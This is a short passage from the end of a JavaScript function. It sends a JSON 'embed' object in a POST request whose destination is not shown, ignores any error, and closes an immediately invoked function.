                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(simpleEmbed)
            }).catch(() => {});
        });
})();
